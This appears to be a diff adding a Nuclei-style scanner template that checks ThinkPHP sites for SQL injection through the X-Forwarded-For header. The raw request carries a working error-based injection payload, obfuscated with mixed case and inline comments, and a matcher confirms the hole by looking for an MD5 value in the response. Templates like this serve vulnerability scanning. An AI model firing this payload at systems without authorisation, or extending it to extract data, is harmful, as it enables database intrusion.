@@ -1,0 +1,33 @@
+id: poc-local-thinkphp-article-x-forwarded-for-sqli
+
+info:
+  name: poc-local-thinkphp-article-x-forwarded-for-sqli
+  author: capiton
+  severity: high
+  description: ""
+  reference: 
+    - https://github.com/bewhale/thinkphp_gui_tools
+  tags: thinkphp
+
+variables:
+  randInt: "{{rand_int(10000,99999)}}"
+  md5_randInt: "{{md5(randInt)}}"
+
+requests:
+  - raw:
+      - |+
+        GET /index.php?s=/home/article/view_recent/name/1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Cache-Control: no-cache
+        Pragma: no-cache
+        X-Forwarded-For: 1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5({{randInt}}))))#
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randInt}}"
